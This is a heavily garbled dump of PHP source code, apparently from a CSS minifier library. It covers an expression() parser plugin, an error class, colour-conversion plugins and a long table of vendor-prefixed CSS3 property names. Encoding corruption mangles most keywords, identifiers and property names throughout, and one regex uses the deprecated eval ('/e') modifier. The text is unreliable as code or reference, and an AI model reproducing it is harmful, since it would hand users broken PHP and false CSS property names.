$l
 = 
	`couÁ
(
$tok’s
);

2521 
	}
}

2536 şas 
	cCssEx´essiÚP¬£rPlugš
 
ex‹nds
 
	maCssP¬£rPlugš


2543 
´iv©e
 
	m$ËáB¿ûs
 = 0;

2549 
´iv©e
 
	m$rightB¿ûs
 = 0;

2555 
public
 
funùiÚ
 
	$g‘Trigg”Ch¬s
()

2557  
	`¬¿y
("(", ")", ";", "}");

2564 
public
 
funùiÚ
 
	$g‘Trigg”S‹s
()

2566  
çl£
;

2567 
	}
}

2576 
public
 
funùiÚ
 
	$·r£
(
$šdex
, 
$ch¬
, 
$´eviousCh¬
, 
$¡©e
)

2579 ià(
$ch¬
 ==ğ"(" && 
	`¡¹Şow”
(
	`sub¡r
(
$this
->
·r£r
->
	`g‘Sourû
(), 
$šdex
 - 10, 11)è==ğ"ex´essiÚ(" && 
$¡©e
 !== "T_EXPRESSION")

2581 
$this
->
·r£r
->
	`pushS‹
("T_EXPRESSION");

2582 
$this
->
ËáB¿ûs
++;

2585 
	`–£if
 (
$ch¬
 ==ğ"(" && 
$¡©e
 === "T_EXPRESSION")

2587 
$this
->
ËáB¿ûs
++;

2590 
	`–£if
 (
$ch¬
 ==ğ")" && 
$¡©e
 === "T_EXPRESSION")

2592 
$this
->
rightB¿ûs
++;

2595 
	`–£if
 ((
$ch¬
 ==ğ";" || $ch¬ ==ğ"}"è&& 
$¡©e
 ==ğ"T_EXPRESSION" && 
$this
->
ËáB¿ûs
 ==ğ$this->
rightB¿ûs
)

2597 
$this
->
ËáB¿ûs
 = $this->
rightB¿ûs
 = 0;

2598 
$this
->
·r£r
->
	`pİS‹
();

2599  
$šdex
 - 1;

2603  
çl£
;

2605  
Œue
;

2606 
	}
}

2619 şas 
	cCssE¼Ü


2626 
public
 
	m$Fe
 = "";

2632 
public
 
	m$Lše
 = 0;

2638 
public
 
	m$Mes§ge
 = "";

2644 
public
 
	m$Sourû
 = "";

2652 
public
 
funùiÚ
 
__cÚ¡ruù
(
$fe
, 
$lše
, 
$mes§ge
, 
$sourû
 = "")

2654 
$this
->
Fe
 = 
$fe
;

2655 
	m$this
->
	mLše
 = 
$lše
;

2656 
	m$this
->
	mMes§ge
 = 
$mes§ge
;

2657 
	m$this
->
	mSourû
 = 
$sourû
;

2664 
public
 
funùiÚ
 
	$__toSŒšg
()

2666  
$this
->
Mes§ge
 . ($this->
Sourû
 ? ": <b¸/><code>" . $this->Sourû . "</code>": ""è. "<b¸/>š f" . $this->
Fe
 . "‡ˆlš" . $this->
Lše
;

2667 
	}
}

2690 şas 
	cCssCÚv”tRgbCŞÜsMšif›rPlugš
 
ex‹nds
 
	maCssMšif›rPlugš


2697 
´iv©e
 
	m$»M©ch
 = "/rgb\s*\(\s*([0-9%]+)\s*,\s*([0-9%]+)\s*,\s*([0-9%]+)\s*\)/iS";

2704 
public
 
funùiÚ
 
	$­¶y
(
aCssTok’
 &
$tok’
)

2706 ià(
	`¡ros
(
$tok’
->
V®ue
, "rgb"è!=ğ
çl£
 && 
	`´eg_m©ch
(
$this
->
»M©ch
, $tok’->V®ue, 
$m
))

2708 
$i
 = 1, 
$l
 = 
	`couÁ
(
$m
); $i < $l; $i++)

2710 ià(
	`¡½os
("%", 
$m
[
$i
]è!=ğ
çl£
)

2712 
$m
[
$i
] = 
	`sub¡r
($m[$i], 0, -1);

2713 
$m
[
$i
] = () (256 * ($m[$i] / 100));

2715 
$m
[
$i
] = 
	`¡r_·d
(
	`dechex
($m[$i]), 2, "0", 
STR_PAD_LEFT
);

2717 
$tok’
->
V®ue
 = 
	`¡r_»¶aû
(
$m
[0], "#" . $m[1] . $m[2] . $m[3], $token->Value);

2719  
çl£
;

2726 
public
 
funùiÚ
 
	$g‘Trigg”Tok’s
()

2728  
¬¿y


2734 
	}
}

2759 şas 
	cCssCÚv”tNamedCŞÜsMšif›rPlugš
 
ex‹nds
 
	maCssMšif›rPlugš


2767 
´iv©e
 
	m$»M©ch
 = 
nuÎ
;

2773 
´iv©e
 
	m$»R•Ïû
 = "\"\${1}\" . \$this->transformation[strtolower(\"\${2}\")] . \"\${3}\"";

2779 
´iv©e
 
	m$ŒªsfÜm©iÚ
 = 
¬¿y


2928 
public
 
funùiÚ
 
__cÚ¡ruù
(
CssMšif›r
 
$mšif›r
, 
¬¿y
 
$cÚfigu¿tiÚ
 = 
	$¬¿y
())

2930 
$this
->
»M©ch
 = "/(^|\s)+(" . 
	`im¶ode
("|", 
	`¬¿y_keys
($this->
ŒªsfÜm©iÚ
)) . ")(\s|$)+/eiS";

2931 
·»Á
::
	`__cÚ¡ruù
(
$mšif›r
, 
$cÚfigu¿tiÚ
);

2939 
public
 
funùiÚ
 
	$­¶y
(
aCssTok’
 &
$tok’
)

2941 
$lcV®ue
 = 
	`¡¹Şow”
(
$tok’
->
V®ue
);

2943 ià(
	`is£t
(
$this
->
ŒªsfÜm©iÚ
[
$lcV®ue
]))

2945 
$tok’
->
V®ue
 = 
$this
->
ŒªsfÜm©iÚ
[
$lcV®ue
];

2948 
	`–£if
 (
	`´eg_m©ch
(
$this
->
»M©ch
, 
$tok’
->
V®ue
))

2950 
$tok’
->
V®ue
 = 
	`´eg_»¶aû
(
$this
->
»M©ch
, $this->
»R•Ïû
, $token->Value);

2952  
çl£
;

2953 
	}
}

2959 
public
 
funùiÚ
 
	$g‘Trigg”Tok’s
()

2961  
¬¿y


2967 
	}
}

2981 şas 
	cCssCÚv”tLev–3Prİ”t›sMšif›rF‹r
 
ex‹nds
 
	maCssMšif›rF‹r


2989 
´iv©e
 
	m$ŒªsfÜm©iÚs
 = 
¬¿y


2992 "ªim©iÚ" => 
¬¿y
(
nuÎ
, "-webkit-animation",‚ull,‚ull),

2993 "ªim©iÚ-d–ay" => 
¬¿y
(
nuÎ
, "-webkit-animation-delay",‚ull,‚ull),

2994 "ªim©iÚ-dœeùiÚ" => 
¬¿y
(
nuÎ
, "-webkit-animation-direction",‚ull,‚ull),

2995 "ªim©iÚ-du¿tiÚ" => 
¬¿y
(
nuÎ
, "-webkit-animation-duration",‚ull,‚ull),

2996 "ªim©iÚ-fl-mode" => 
¬¿y
(
nuÎ
, "-webkit-animation-fill-mode",‚ull,‚ull),

2997 "ªim©iÚ-™”©iÚ-couÁ" => 
¬¿y
(
nuÎ
, "-webkit-animation-iteration-count",‚ull,‚ull),

2998 "ªim©iÚ-Çme" => 
¬¿y
(
nuÎ
, "-webkit-animation-name",‚ull,‚ull),

2999 "ªim©iÚ-¶ay-¡©e" => 
¬¿y
(
nuÎ
, "-webkit-animation-play-state",‚ull,‚ull),

3000 "ªim©iÚ-timšg-funùiÚ" => 
¬¿y
(
nuÎ
, "-webkit-animation-timing-function",‚ull,‚ull),

3001 "­³¬ªû" => 
¬¿y
("-moz-­³¬ªû", "-webk™-­³¬ªû", 
nuÎ
,‚ull),

3002 "backçû-visib™y" => 
¬¿y
(
nuÎ
, "-webkit-backface-visibility",‚ull,‚ull),

3003 "background-ş" => 
¬¿y
(
nuÎ
, "-webkit-background-clip",‚ull,‚ull),

3004 "background-compos™e" => 
¬¿y
(
nuÎ
, "-webkit-background-composite",‚ull,‚ull),

3005 "background-šlše-pŞicy" => 
¬¿y
("-moz-background-šlše-pŞicy", 
nuÎ
,‚ull,‚ull),

3006 "background-Üigš" => 
¬¿y
(
nuÎ
, "-webkit-background-origin",‚ull,‚ull),

3007 "background-pos™iÚ-x" => 
¬¿y
(
nuÎ
,‚ull,‚ull, "-ms-background-position-x"),

3008 "background-pos™iÚ-y" => 
¬¿y
(
nuÎ
,‚ull,‚ull, "-ms-background-position-y"),

3009 "background-size" => 
¬¿y
(
nuÎ
, "-webkit-background-size",‚ull,‚ull),

3010 "behaviÜ" => 
¬¿y
(
nuÎ
,‚ull,‚ull, "-ms-behavior"),

3011 "bšdšg" => 
¬¿y
("-moz-bšdšg", 
nuÎ
,‚ull,‚ull),

3012 "bÜd”-aá”" => 
¬¿y
(
nuÎ
, "-webkit-border-after",‚ull,‚ull),

3013 "bÜd”-aá”-cŞÜ" => 
¬¿y
(
nuÎ
, "-webkit-border-after-color",‚ull,‚ull),

3014 "bÜd”-aá”-¡yË" => 
¬¿y
(
nuÎ
, "-webkit-border-after-style",‚ull,‚ull),

3015 "bÜd”-aá”-width" => 
¬¿y
(
nuÎ
, "-webkit-border-after-width",‚ull,‚ull),

3016 "bÜd”-befÜe" => 
¬¿y
(
nuÎ
, "-webkit-border-before",‚ull,‚ull),

3017 "bÜd”-befÜe-cŞÜ" => 
¬¿y
(
nuÎ
, "-webkit-border-before-color",‚ull,‚ull),

3018 "bÜd”-befÜe-¡yË" => 
¬¿y
(
nuÎ
, "-webkit-border-before-style",‚ull,‚ull),

3019 "bÜd”-befÜe-width" => 
¬¿y
(
nuÎ
, "-webkit-border-before-width",‚ull,‚ull),

3020 "bÜd”-bÜd”-bÙtom-cŞÜs" => 
¬¿y
("-moz-bÜd”-bÙtom-cŞÜs", 
nuÎ
,‚ull,‚ull),

3021 "bÜd”-bÙtom-Ëá-¿dius" => 
¬¿y
("-moz-bÜd”-¿dius-bÙtomËá", "-webk™-bÜd”-bÙtom-Ëá-¿dius", 
nuÎ
,‚ull),

3022 "bÜd”-bÙtom-right-¿dius" => 
¬¿y
("-moz-bÜd”-¿dius-bÙtomright", "-webk™-bÜd”-bÙtom-right-¿dius", 
nuÎ
,‚ull),

3023 "bÜd”-’d" => 
¬¿y
("-moz-bÜd”-’d", "-webk™-bÜd”-’d", 
nuÎ
,‚ull),

3024 "bÜd”-’d-cŞÜ" => 
¬¿y
("-moz-bÜd”-’d-cŞÜ", "-webk™-bÜd”-’d-cŞÜ", 
nuÎ
,‚ull),

3025 "bÜd”-’d-¡yË" => 
¬¿y
("-moz-bÜd”-’d-¡yË", "-webk™-bÜd”-’d-¡yË", 
nuÎ
,‚ull),

3026 "bÜd”-’d-width" => 
¬¿y
("-moz-bÜd”-’d-width", "-webk™-bÜd”-’d-width", 
nuÎ
,‚ull),

3027 "bÜd”-f™" => 
¬¿y
(
nuÎ
, "-webkit-border-fit",‚ull,‚ull),

3028 "bÜd”-hÜizÚl-¥acšg" => 
¬¿y
(
nuÎ
, "-webkit-border-horizontal-spacing",‚ull,‚ull),

3029 "bÜd”-image" => 
¬¿y
("-moz-bÜd”-image", "-webk™-bÜd”-image", 
nuÎ
,‚ull),

3030 "bÜd”-Ëá-cŞÜs" => 
¬¿y
("-moz-bÜd”-Ëá-cŞÜs", 
nuÎ
,‚ull,‚ull),

3031 "bÜd”-¿dius" => 
¬¿y
("-moz-bÜd”-¿dius", "-webk™-bÜd”-¿dius", 
nuÎ
,‚ull),

3032 "bÜd”-bÜd”-right-cŞÜs" => 
¬¿y
("-moz-bÜd”-right-cŞÜs", 
nuÎ
,‚ull,‚ull),

3033 "bÜd”-¡¬t" => 
¬¿y
("-moz-bÜd”-¡¬t", "-webk™-bÜd”-¡¬t", 
nuÎ
,‚ull),

3034 "bÜd”-¡¬t-cŞÜ" => 
¬¿y
("-moz-bÜd”-¡¬t-cŞÜ", "-webk™-bÜd”-¡¬t-cŞÜ", 
nuÎ
,‚ull),

3035 "bÜd”-¡¬t-¡yË" => 
¬¿y
("-moz-bÜd”-¡¬t-¡yË", "-webk™-bÜd”-¡¬t-¡yË", 
nuÎ
,‚ull),

3036 "bÜd”-¡¬t-width" => 
¬¿y
("-moz-bÜd”-¡¬t-width", "-webk™-bÜd”-¡¬t-width", 
nuÎ
,‚ull),

3037 "bÜd”-tİ-cŞÜs" => 
¬¿y
("-moz-bÜd”-tİ-cŞÜs", 
nuÎ
,‚ull,‚ull),

3038 "bÜd”-tİ-Ëá-¿dius" => 
¬¿y
("-moz-bÜd”-¿dius-tİËá", "-webk™-bÜd”-tİ-Ëá-¿dius", 
nuÎ
,‚ull),

3039 "bÜd”-tİ-right-¿dius" => 
¬¿y
("-moz-bÜd”-¿dius-tİright", "-webk™-bÜd”-tİ-right-¿dius", 
nuÎ
,‚ull),

3040 "bÜd”-v”tiÿl-¥acšg" => 
¬¿y
(
nuÎ
, "-webkit-border-vertical-spacing",‚ull,‚ull),

3041 "box-®ign" => 
¬¿y
("-moz-box-®ign", "-webk™-box-®ign", 
nuÎ
,‚ull),

3042 "box-dœeùiÚ" => 
¬¿y
("-moz-box-dœeùiÚ", "-webk™-box-dœeùiÚ", 
nuÎ
,‚ull),

3043 "box-æex" => 
¬¿y
("-moz-box-æex", "-webk™-box-æex", 
nuÎ
,‚ull),

3044 "box-æex-group" => 
¬¿y
(
nuÎ
, "-webkit-box-flex-group",‚ull,‚ull),

3045 "box-æex-lšes" => 
¬¿y
(
nuÎ
, "-webkit-box-flex-lines",‚ull,‚ull),

3046 "box-Üdš®-group" => 
¬¿y
("-moz-box-Üdš®-group", "-webk™-box-Üdš®-group", 
nuÎ
,‚ull),

3047 "box-Ü›Á" => 
¬¿y
("-moz-box-Ü›Á", "-webk™-box-Ü›Á", 
nuÎ
,‚ull),

3048 "box-·ck" => 
¬¿y
("-moz-box-·ck", "-webk™-box-·ck", 
nuÎ
,‚ull),

3049 "box-»æeù" => 
¬¿y
(
nuÎ
, "-webkit-box-reflect",‚ull,‚ull),

3050 "box-shadow" => 
¬¿y
("-moz-box-shadow", "-webk™-box-shadow", 
nuÎ
,‚ull),

3051 "box-sizšg" => 
¬¿y
("-moz-box-sizšg", 
nuÎ
,‚ull,‚ull),

3052 "cŞÜ-cÜ»ùiÚ" => 
¬¿y
(
nuÎ
, "-webkit-color-correction",‚ull,‚ull),

3053 "cŞumn-b»ak-aá”" => 
¬¿y
(
nuÎ
, "-webkit-column-break-after",‚ull,‚ull),

3054 "cŞumn-b»ak-befÜe" => 
¬¿y
(
nuÎ
, "-webkit-column-break-before",‚ull,‚ull),

3055 "cŞumn-b»ak-šside" => 
¬¿y
(
nuÎ
, "-webkit-column-break-inside",‚ull,‚ull),

3056 "cŞumn-couÁ" => 
¬¿y
("-moz-cŞumn-couÁ", "-webk™-cŞumn-couÁ", 
nuÎ
,‚ull),

3057 "cŞumn-g­" => 
¬¿y
("-moz-cŞumn-g­", "-webk™-cŞumn-g­", 
nuÎ
,‚ull),

3058 "cŞumn-ruË" => 
¬¿y
("-moz-cŞumn-ruË", "-webk™-cŞumn-ruË", 
nuÎ
,‚ull),

3059 "cŞumn-ruË-cŞÜ" => 
¬¿y
("-moz-cŞumn-ruË-cŞÜ", "-webk™-cŞumn-ruË-cŞÜ", 
nuÎ
,‚ull),

3060 "cŞumn-ruË-¡yË" => 
¬¿y
("-moz-cŞumn-ruË-¡yË", "-webk™-cŞumn-ruË-¡yË", 
nuÎ
,‚ull),

3061 "cŞumn-ruË-width" => 
¬¿y
("-moz-cŞumn-ruË-width", "-webk™-cŞumn-ruË-width", 
nuÎ
,‚ull),

3062 "cŞumn-¥ª" => 
¬¿y
(
nuÎ
, "-webkit-column-span",‚ull,‚ull),

3063 "cŞumn-width" => 
¬¿y
("-moz-cŞumn-width", "-webk™-cŞumn-width", 
nuÎ
,‚ull),

3064 "cŞumns" => 
¬¿y
(
nuÎ
, "-webkit-columns",‚ull,‚ull),

3065 "f‹r" => 
¬¿y
(
__CLASS__
, "filter"),

3066 "æßt-edge" => 
¬¿y
("-moz-æßt-edge", 
nuÎ
,‚ull,‚ull),

3067 "fÚt-ã©u»-£‰šgs" => 
¬¿y
("-moz-fÚt-ã©u»-£‰šgs", 
nuÎ
,‚ull,‚ull),

3068 "fÚt-Ïnguage-ov”ride" => 
¬¿y
("-moz-fÚt-Ïnguage-ov”ride", 
nuÎ
,‚ull,‚ull),

3069 "fÚt-size-d–" => 
¬¿y
(
nuÎ
, "-webkit-font-size-delta",‚ull,‚ull),

3070 "fÚt-smoÙhšg" => 
¬¿y
(
nuÎ
, "-webkit-font-smoothing",‚ull,‚ull),

3071 "fÜû-brok’-image-icÚ" => 
¬¿y
("-moz-fÜû-brok’-image-icÚ", 
nuÎ
,‚ull,‚ull),

3072 "highlight" => 
¬¿y
(
nuÎ
, "-webkit-highlight",‚ull,‚ull),

3073 "hyph’©e-ch¬aù”" => 
¬¿y
(
nuÎ
, "-webkit-hyphenate-character",‚ull,‚ull),

3074 "hyph’©e-loÿË" => 
¬¿y
(
nuÎ
, "-webkit-hyphenate-locale",‚ull,‚ull),

3075 "hyph’s" => 
¬¿y
(
nuÎ
, "-webkit-hyphens",‚ull,‚ull),

3076 "fÜû-brok’-image-icÚ" => 
¬¿y
("-moz-image-»giÚ", 
nuÎ
,‚ull,‚ull),

3077 "ime-mode" => 
¬¿y
(
nuÎ
,‚ull,‚ull, "-ms-ime-mode"),

3078 "š‹½Ş©iÚ-mode" => 
¬¿y
(
nuÎ
,‚ull,‚ull, "-ms-interpolation-mode"),

3079 "Ïyout-æow" => 
¬¿y
(
nuÎ
,‚ull,‚ull, "-ms-layout-flow"),

3080 "Ïyout-grid" => 
¬¿y
(
nuÎ
,‚ull,‚ull, "-ms-layout-grid"),

3081 "Ïyout-grid-ch¬" => 
¬¿y
(
nuÎ
,‚ull,‚ull, "-ms-layout-grid-char"),

3082 "Ïyout-grid-lše" => 
¬¿y
(
nuÎ
,‚ull,‚ull, "-ms-layout-grid-line"),

3083 "Ïyout-grid-mode" => 
¬¿y
(
nuÎ
,‚ull,‚ull, "-ms-layout-grid-mode"),

3084 "Ïyout-grid-ty³" => 
¬¿y
(
nuÎ
,‚ull,‚ull, "-ms-layout-grid-type"),

3085 "lše-b»ak" => 
¬¿y
(
nuÎ
, "-webkit-line-break",‚ull, "-ms-line-break"),

3086 "lše-şamp" => 
¬¿y
(
nuÎ
, "-webkit-line-clamp",‚ull,‚ull),

3087 "lše-grid-mode" => 
¬¿y
(
nuÎ
,‚ull,‚ull, "-ms-line-grid-mode"),

3088 "logiÿl-height" => 
¬¿y
(
nuÎ
, "-webkit-logical-height",‚ull,‚ull),

3089 "logiÿl-width" => 
¬¿y
(
nuÎ
, "-webkit-logical-width",‚ull,‚ull),

3090 "m¬gš-aá”" => 
¬¿y
(
nuÎ
, "-webkit-margin-after",‚ull,‚ull),

3091 "m¬gš-aá”-cŞÏp£" => 
¬¿y
(
nuÎ
, "-webkit-margin-after-collapse",‚ull,‚ull),

3092 "m¬gš-befÜe" => 
¬¿y
(
nuÎ
, "-webkit-margin-before",‚ull,‚ull),

3093 "m¬gš-befÜe-cŞÏp£" => 
¬¿y
(
nuÎ
, "-webkit-margin-before-collapse",‚ull,‚ull),

3094 "m¬gš-bÙtom-cŞÏp£" => 
¬¿y
(
nuÎ
, "-webkit-margin-bottom-collapse",‚ull,‚ull),

3095 "m¬gš-cŞÏp£" => 
¬¿y
(
nuÎ
, "-webkit-margin-collapse",‚ull,‚ull),

3096 "m¬gš-’d" => 
¬¿y
("-moz-m¬gš-’d", "-webk™-m¬gš-’d", 
nuÎ
,‚ull),

3097 "m¬gš-¡¬t" => 
¬¿y
("-moz-m¬gš-¡¬t", "-webk™-m¬gš-¡¬t", 
nuÎ
,‚ull),

3098 "m¬gš-tİ-cŞÏp£" => 
¬¿y
(
nuÎ
, "-webkit-margin-top-collapse",‚ull,‚ull),

3099 "m¬qu“ " => 
¬¿y
(
nuÎ
, "-webkit-marquee",‚ull,‚ull),

3100 "m¬qu“-dœeùiÚ" => 
¬¿y
(
nuÎ
, "-webkit-marquee-direction",‚ull,‚ull),

3101 "m¬qu“-šüem’t" => 
¬¿y
(
nuÎ
, "-webkit-marquee-increment",‚ull,‚ull),

3102 "m¬qu“-»³t™iÚ" => 
¬¿y
(
nuÎ
, "-webkit-marquee-repetition",‚ull,‚ull),

3103 "m¬qu“-¥“d" => 
¬¿y
(
nuÎ
, "-webkit-marquee-speed",‚ull,‚ull),

3104 "m¬qu“-¡yË" => 
¬¿y
(
nuÎ
, "-webkit-marquee-style",‚ull,‚ull),

3105 "mask" => 
¬¿y
(
nuÎ
, "-webkit-mask",‚ull,‚ull),

3106 "mask-©chm’t" => 
¬¿y
(
nuÎ
, "-webkit-mask-attachment",‚ull,‚ull),

3107 "mask-box-image" => 
¬¿y
(
nuÎ
, "-webkit-mask-box-image",‚ull,‚ull),

3108 "mask-ş" => 
¬¿y
(
nuÎ
, "-webkit-mask-clip",‚ull,‚ull),

3109 "mask-compos™e" => 
¬¿y
(
nuÎ
, "-webkit-mask-composite",‚ull,‚ull),

3110 "mask-image" => 
¬¿y
(
nuÎ
, "-webkit-mask-image",‚ull,‚ull),

3111 "mask-Üigš" => 
¬¿y
(
nuÎ
, "-webkit-mask-origin",‚ull,‚ull),

3112 "mask-pos™iÚ" => 
¬¿y
(
nuÎ
, "-webkit-mask-position",‚ull,‚ull),

3113 "mask-pos™iÚ-x" => 
¬¿y
(
nuÎ
, "-webkit-mask-position-x",‚ull,‚ull),

3114 "mask-pos™iÚ-y" => 
¬¿y
(
nuÎ
, "-webkit-mask-position-y",‚ull,‚ull),

3115 "mask-»³©" => 
¬¿y
(
nuÎ
, "-webkit-mask-repeat",‚ull,‚ull),

3116 "mask-»³©-x" => 
¬¿y
(
nuÎ
, "-webkit-mask-repeat-x",‚ull,‚ull),

3117 "mask-»³©-y" => 
¬¿y
(
nuÎ
, "-webkit-mask-repeat-y",‚ull,‚ull),

3118 "mask-size" => 
¬¿y
(
nuÎ
, "-webkit-mask-size",‚ull,‚ull),

3119 "m©ch-Ã¬e¡-ma-blockquÙe-cŞÜ" => 
¬¿y
(
nuÎ
, "-webkit-match-nearest-mail-blockquote-color",‚ull,‚ull),

3120 "max-logiÿl-height" => 
¬¿y
(
nuÎ
, "-webkit-max-logical-height",‚ull,‚ull),

3121 "max-logiÿl-width" => 
¬¿y
(
nuÎ
, "-webkit-max-logical-width",‚ull,‚ull),

3122 "mš-logiÿl-height" => 
¬¿y
(
nuÎ
, "-webkit-min-logical-height",‚ull,‚ull),

3123 "mš-logiÿl-width" => 
¬¿y
(
nuÎ
, "-webkit-min-logical-width",‚ull,‚ull),

3124 "objeù-f™" => 
¬¿y
(
nuÎ
,‚ull, "-o-object-fit",‚ull),

3125 "objeù-pos™iÚ" => 
¬¿y
(
nuÎ
,‚ull, "-o-object-position",‚ull),

3126 "İac™y" => 
¬¿y
(
__CLASS__
, "opacity"),

3127 "ouše-¿dius" => 
¬¿y
("-moz-ouše-¿dius", 
nuÎ
,‚ull,‚ull),

3128 "ouše-bÙtom-Ëá-¿dius" => 
¬¿y
("-moz-ouše-¿dius-bÙtomËá", 
nuÎ
,‚ull,‚ull),

3129 "ouše-bÙtom-right-¿dius" => 
¬¿y
("-moz-ouše-¿dius-bÙtomright", 
nuÎ
,‚ull,‚ull),

3130 "ouše-tİ-Ëá-¿dius" => 
¬¿y
("-moz-ouše-¿dius-tİËá", 
nuÎ
,‚ull,‚ull),

3131 "ouše-tİ-right-¿dius" => 
¬¿y
("-moz-ouše-¿dius-tİright", 
nuÎ
,‚ull,‚ull),

3132 "·ddšg-aá”" => 
¬¿y
(
nuÎ
, "-webkit-padding-after",‚ull,‚ull),

3133 "·ddšg-befÜe" => 
¬¿y
(
nuÎ
, "-webkit-padding-before",‚ull,‚ull),

3134 "·ddšg-’d" => 
¬¿y
("-moz-·ddšg-’d", "-webk™-·ddšg-’d", 
nuÎ
,‚ull),

3135 "·ddšg-¡¬t" => 
¬¿y
("-moz-·ddšg-¡¬t", "-webk™-·ddšg-¡¬t", 
nuÎ
,‚ull),

3136 "³r¥eùive" => 
¬¿y
(
nuÎ
, "-webkit-perspective",‚ull,‚ull),

3137 "³r¥eùive-Üigš" => 
¬¿y
(
nuÎ
, "-webkit-perspective-origin",‚ull,‚ull),

3138 "³r¥eùive-Üigš-x" => 
¬¿y
(
nuÎ
, "-webkit-perspective-origin-x",‚ull,‚ull),

3139 "³r¥eùive-Üigš-y" => 
¬¿y
(
nuÎ
, "-webkit-perspective-origin-y",‚ull,‚ull),

3140 "¹l-Üd”šg" => 
¬¿y
(
nuÎ
, "-webkit-rtl-ordering",‚ull,‚ull),

3141 "süŞlb¬-3dlight-cŞÜ" => 
¬¿y
(
nuÎ
,‚ull,‚ull, "-ms-scrollbar-3dlight-color"),

3142 "süŞlb¬-¬row-cŞÜ" => 
¬¿y
(
nuÎ
,‚ull,‚ull, "-ms-scrollbar-arrow-color"),

3143 "süŞlb¬-ba£-cŞÜ" => 
¬¿y
(
nuÎ
,‚ull,‚ull, "-ms-scrollbar-base-color"),

3144 "süŞlb¬-d¬kshadow-cŞÜ" => 
¬¿y
(
nuÎ
,‚ull,‚ull, "-ms-scrollbar-darkshadow-color"),

3145 "süŞlb¬-çû-cŞÜ" => 
¬¿y
(
nuÎ
,‚ull,‚ull, "-ms-scrollbar-face-color"),

3146 "süŞlb¬-highlight-cŞÜ" => 
¬¿y
(
nuÎ
,‚ull,‚ull, "-ms-scrollbar-highlight-color"),

3147 "süŞlb¬-shadow-cŞÜ" => 
¬¿y
(
nuÎ
,‚ull,‚ull, "-ms-scrollbar-shadow-color"),

3148 "süŞlb¬-Œack-cŞÜ" => 
¬¿y
(
nuÎ
,‚ull,‚ull, "-ms-scrollbar-track-color"),

3149 "¡ack-sizšg" => 
¬¿y
("-moz-¡ack-sizšg", 
nuÎ
,‚ull,‚ull),

3150 "svg-shadow" => 
¬¿y
(
nuÎ
, "-webkit-svg-shadow",‚ull,‚ull),

3151 "b-size" => 
¬¿y
("-moz-b-size", 
nuÎ
, "-o-tab-size",‚ull),

3152 "bË-ba£lše" => 
¬¿y
(
nuÎ
,‚ull, "-o-table-baseline",‚ull),

3153 "‹xt-®ign-Ï¡" => 
¬¿y
(
nuÎ
,‚ull,‚ull, "-ms-text-align-last"),

3154 "‹xt-auto¥aû" => 
¬¿y
(
nuÎ
,‚ull,‚ull, "-ms-text-autospace"),

3155 "‹xt-combše" => 
¬¿y
(
nuÎ
, "-webkit-text-combine",‚ull,‚ull),

3156 "‹xt-decÜ©iÚs-š-efãù" => 
¬¿y
(
nuÎ
, "-webkit-text-decorations-in-effect",‚ull,‚ull),

3157 "‹xt-emphasis" => 
¬¿y
(
nuÎ
, "-webkit-text-emphasis",‚ull,‚ull),

3158 "‹xt-emphasis-cŞÜ" => 
¬¿y
(
nuÎ
, "-webkit-text-emphasis-color",‚ull,‚ull),

3159 "‹xt-emphasis-pos™iÚ" => 
¬¿y
(
nuÎ
, "-webkit-text-emphasis-position",‚ull,‚ull),

3160 "‹xt-emphasis-¡yË" => 
¬¿y
(
nuÎ
, "-webkit-text-emphasis-style",‚ull,‚ull),

3161 "‹xt-fl-cŞÜ" => 
¬¿y
(
nuÎ
, "-webkit-text-fill-color",‚ull,‚ull),

3162 "‹xt-ju¡ify" => 
¬¿y
(
nuÎ
,‚ull,‚ull, "-ms-text-justify"),

3163 "‹xt-kashida-¥aû" => 
¬¿y
(
nuÎ
,‚ull,‚ull, "-ms-text-kashida-space"),

3164 "‹xt-ov”æow" => 
¬¿y
(
nuÎ
,‚ull, "-o-text-overflow", "-ms-text-overflow"),

3165 "‹xt-£cur™y" => 
¬¿y
(
nuÎ
, "-webkit-text-security",‚ull,‚ull),

3166 "‹xt-size-adju¡" => 
¬¿y
(
nuÎ
, "-webkit-text-size-adjust",‚ull, "-ms-text-size-adjust"),

3167 "‹xt-¡roke" => 
¬¿y
(
nuÎ
, "-webkit-text-stroke",‚ull,‚ull),

3168 "‹xt-¡roke-cŞÜ" => 
¬¿y
(
nuÎ
, "-webkit-text-stroke-color",‚ull,‚ull),

3169 "‹xt-¡roke-width" => 
¬¿y
(
nuÎ
, "-webkit-text-stroke-width",‚ull,‚ull),

3170 "‹xt-und”lše-pos™iÚ" => 
¬¿y
(
nuÎ
,‚ull,‚ull, "-ms-text-underline-position"),

3171 "ŒªsfÜm" => 
¬¿y
("-moz-ŒªsfÜm", "-webk™-ŒªsfÜm", "-o-ŒªsfÜm", 
nuÎ
),

3172 "ŒªsfÜm-Üigš" => 
¬¿y
("-moz-ŒªsfÜm-Üigš", "-webk™-ŒªsfÜm-Üigš", "-o-ŒªsfÜm-Üigš", 
nuÎ
),

3173 "ŒªsfÜm-Üigš-x" => 
¬¿y
(
nuÎ
, "-webkit-transform-origin-x",‚ull,‚ull),

3174 "ŒªsfÜm-Üigš-y" => 
¬¿y
(
nuÎ
, "-webkit-transform-origin-y",‚ull,‚ull),

3175 "ŒªsfÜm-Üigš-z" => 
¬¿y
(
nuÎ
, "-webkit-transform-origin-z",‚ull,‚ull),

3176 "ŒªsfÜm-¡yË" => 
¬¿y
(
nuÎ
, "-webkit-transform-style",‚ull,‚ull),

3177 "Œªs™iÚ" => 
¬¿y
("-moz-Œªs™iÚ", "-webk™-Œªs™iÚ", "-o-Œªs™iÚ", 
nuÎ
),

3178 "Œªs™iÚ-d–ay" => 
¬¿y
("-moz-Œªs™iÚ-d–ay", "-webk™-Œªs™iÚ-d–ay", "-o-Œªs™iÚ-d–ay", 
nuÎ
),

3179 "Œªs™iÚ-du¿tiÚ" => 
¬¿y
("-moz-Œªs™iÚ-du¿tiÚ", "-webk™-Œªs™iÚ-du¿tiÚ", "-o-Œªs™iÚ-du¿tiÚ", 
nuÎ
),

3180 "Œªs™iÚ-´İ”ty" => 
¬¿y
("-moz-Œªs™iÚ-´İ”ty", "-webk™-Œªs™iÚ-´İ”ty", "-o-Œªs™iÚ-´İ”ty", 
nuÎ
),

3181 "Œªs™iÚ-timšg-funùiÚ" => 
¬¿y
("-moz-Œªs™iÚ-timšg-funùiÚ", "-webk™-Œªs™iÚ-timšg-funùiÚ", "-o-Œªs™iÚ-timšg-funùiÚ", 
nuÎ
),

3182 "u£r-d¿g" => 
¬¿y
(
nuÎ
, "-webkit-user-drag",‚ull,‚ull),

3183 "u£r-focus" => 
¬¿y
("-moz-u£r-focus", 
nuÎ
,‚ull,‚ull),

3184 "u£r-šput" => 
¬¿y
